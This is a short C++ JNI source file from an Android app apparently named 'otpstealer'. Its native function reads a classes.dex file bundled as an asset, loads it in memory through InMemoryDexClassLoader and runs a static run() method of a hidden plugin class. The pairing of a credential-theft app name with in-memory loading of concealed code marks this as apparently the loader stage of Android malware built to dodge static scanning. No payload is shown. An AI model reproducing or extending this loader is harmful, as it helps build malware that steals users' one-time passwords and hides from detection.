#include <jni.h>
#include <string>
#include <android/asset_manager.h>
#include <android/asset_manager_jni.h>
#include <android/log.h>

#define LOG_TAG "DexLoaderJNI"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

extern "C"
JNIEXPORT jstring JNICALL
Java_com_example_otpstealer_MainActivity_stringFromJNI(
        JNIEnv* env,
        jobject thiz) {
    jclass activityClass = env->GetObjectClass(thiz);
    jmethodID getAssetsMethod = env->GetMethodID(activityClass, "getAssets", "()Landroid/content/res/AssetManager;");
    jobject assetManagerObj = env->CallObjectMethod(thiz, getAssetsMethod);
    AAssetManager* mgr = AAssetManager_fromJava(env, assetManagerObj);

    // open DEX file from res/raw
    AAsset* asset = AAssetManager_open(mgr, "classes.dex", AASSET_MODE_BUFFER);
    if (!asset) {
        LOGE("Failed to open DEX file");
        return env->NewStringUTF("Failed to open DEX file");
    }

    off_t length = AAsset_getLength(asset);
    const void* dexData = AAsset_getBuffer(asset);
    if (!dexData) {
        LOGE("Failed to read DEX data");
        return env->NewStringUTF("Failed to read DEX data");
    }

    jobject dexBuffer = env->NewDirectByteBuffer((void*)dexData, length);

    jmethodID getClassLoader = env->GetMethodID(activityClass, "getClassLoader", "()Ljava/lang/ClassLoader;");
    jobject parentClassLoader = env->CallObjectMethod(thiz, getClassLoader);

    jclass inMemoryDexClassLoaderClass = env->FindClass("dalvik/system/InMemoryDexClassLoader");
    jmethodID inMemoryDexCtor = env->GetMethodID(inMemoryDexClassLoaderClass, "<init>", "(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V");
    jobject dexClassLoader = env->NewObject(inMemoryDexClassLoaderClass, inMemoryDexCtor, dexBuffer, parentClassLoader);

    jclass classLoaderClass = env->GetObjectClass(dexClassLoader);
    jmethodID loadClassMethod = env->GetMethodID(classLoaderClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
    jstring className = env->NewStringUTF("com.example.MyPlugin");
    jclass pluginClass = (jclass)env->CallObjectMethod(dexClassLoader, loadClassMethod, className);

    jmethodID runMethod = env->GetStaticMethodID(pluginClass, "run", "()Ljava/lang/String;");
    jstring result = (jstring)env->CallStaticObjectMethod(pluginClass, runMethod);

    return result;
}
